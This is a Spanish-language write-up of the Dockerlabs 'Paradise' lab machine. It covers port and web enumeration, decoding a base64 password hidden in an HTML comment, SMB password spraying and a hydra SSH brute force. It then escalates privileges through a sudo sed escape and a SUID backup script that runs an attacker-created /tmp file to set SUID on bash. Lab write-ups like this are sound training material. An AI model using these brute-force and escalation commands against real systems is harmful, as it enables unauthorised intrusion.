
# Writeup Template: Maquina `[ Paradise ]`

- Tags: #Paradise
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Paradise](https://mega.nz/file/zE9XSRaY#9QeNmFoqVzz1JFb4iR-3uqVFhMLMCf7wwbC5NsX1A_0)

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x paradise.zip
sudo bash auto_deploy.sh paradise.tar
```

---

## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80,139,445 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.7 ((UbuntuTrusty))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: PARADISE)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: PARADISE)
```
---

## Enumeracion de [Servicio Web Principal]
### Tecnologías Detectadas
URL del servicio principal
```bash
http://172.17.0.2/
```

Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Resultado:
```bash
/login.php: Possible admin folder
/img/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada critico
### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,backup,html,sh,txt
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 950]
/img                  (Status: 301) [Size: 305] [--> http://172.17.0.2/img/]
/login.php            (Status: 200) [Size: 1696]
/galery.html          (Status: 200) [Size: 2369]
/booking.html         (Status: 200) [Size: 2058]
```

Revisando el codigo fuente en esta ruta:
```bash
http://172.17.0.2/galery.html
```

Tenemos lo siguiente una cadena en **base64**:
```bash
<!-- ZXN0b2VzdW5zZWNyZXRvCg== -->
```

Decodificamos la cadena:
```bash
echo "ZXN0b2VzdW5zZWNyZXRvCg==" | base64 -d
```

Resultado: Tenemos una potencial password:
```bash
estoesunsecreto
```

En esta direccion **URL** tenemos un panel de inicio de sesion que nos pide un correo que no tenemos y un codigo para podernos loguear:

## Enumeracion de [Servicio SMB SAMBA]
Procedemos a enumerar este servicio. Listamos los servicios compartidos:
```bash
smbclient -L 172.17.0.2 -N

# Resultado
Sharename       Type      Comment
---------       ----      -------
sambashare      Disk      
IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
```

Ahora realizamos una enumeracion con esta herramienta:
```bash
enum4linux -S 172.17.0.2
```

Resultado:
```bash
[E] Can't understand response:

tree connect failed: NT_STATUS_BAD_NETWORK_NAME
//172.17.0.2/sambashare Mapping: N/A Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//172.17.0.2/IPC$       Mapping: N/A Listing: N/A Writing: N/A
enum4linux complete on Wed Jun  4 00:31:29 2025
```

Sabiendo que tenemos una posible password: **( estoesunsecreto )** realizaremos un ataque de fuerza bruta para ver si existe algun usuario con esa posible password:
```bash
crackmapexec smb 172.17.0.2 -u /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -p passwd.txt
```

Tenemos un potencial usuario
### Credenciales Encontradas
- Usuario: `[ info ]`
- Contraseña: `[ estoesunsecreto ]`

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que tenemos un usuario para este servicio **SMB** lo usaremos para conectarnos y obtener los recursos compartidos para este usuario
Al intentar conectarnos falla la conexion:
```bash
rpcclient -U info -P estoesunsecreto 172.17.0.2
```

Asi que probaremos si es un posible directorio:
```bash
http://172.17.0.2/estoesunsecreto/
```

Ahora vemos que si existe como recurso:
```bash
http://172.17.0.2/estoesunsecreto/mensaje_para_lucas.txt
```

En el recuros explica que debe cambiar su contrasena porque es debil, Lo que aremos es intentar un ataque de fuerza bruta con **hydra** para ese usuario:
### Ejecucion del Ataque
```bash
# Comandos para explotación
hydra -l lucas -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

### Intrusion
Ahora que tenemos las credenciales de este usuario:
```bash
[22][ssh] host: 172.17.0.2   login: lucas   password: chocolate
```

Nos conectamos por **ssh**
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh lucas@172.17.0.2 # ( chocolate )
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
sudo -l

User lucas may run the following commands on 70405872b45c:
    (andy) NOPASSWD: /bin/sed # Tenemos este binario para migrar al usuario andy
```

**Hallazgos Clave:**
- Binario con privilegios: `[ /bin/sed ]`
- Credenciales de usuario: `[ andy ]:[]`

### Explotacion de Privilegios

###### Usuario `[ lucas ]`:

```bash
# Comando para escalar al usuario: ( root )
sudo -u andy sed -n '1e exec bash 1>&0' /etc/hosts
```

###### Usuario `[ andy ]`:
Ahora listando los permisos **SUID**
```bash
find / -perm -4000 2>/dev/null
```

Tenemos este binario:
```bash
/usr/local/bin/backup.sh
```

Si listamos el contenido de este script:
```bash
cat /usr/local/bin/backup.sh
```

```bash
#!/bin/bash
# backup.sh

# Script de backup vulnerable

# Copiar archivos al directorio compartido
cp -r /var/www/html /backup

# Intentar ejecutar un script si existe
if [ -f /tmp/cron-vuln.sh ]; then
    /bin/bash /tmp/cron-vuln.sh
fi
```

**Nota** Esta intentado ejecutar el script **( cron-vuln.sh )** pero como no existe, Nos aprovechamos de eso para crearlo con instrucciones malciosas que nos permitan migrar a **root**
```bash
chmod u+s /bin/bash
```

Ya con las instrucciones cargadas para otorgar permisos **SUID** a la bash, Procedemos a ejecutarlo:
```bash
/usr/local/bin/backup.sh
```

De igual manero ganamos acceso como root con este otro binario:
```bash
# Comando para escalar al usuario: ( root )
/usr/local/bin/privileged_exec

Running with effective UID: 0
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@70405872b45c:/tmp# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a revertir cadenas en **base64**
2. Aprendimos a enumerar el servicio **SMB**

## Recomendaciones de Seguridad
- No ocultar directorios sensibles en **base64**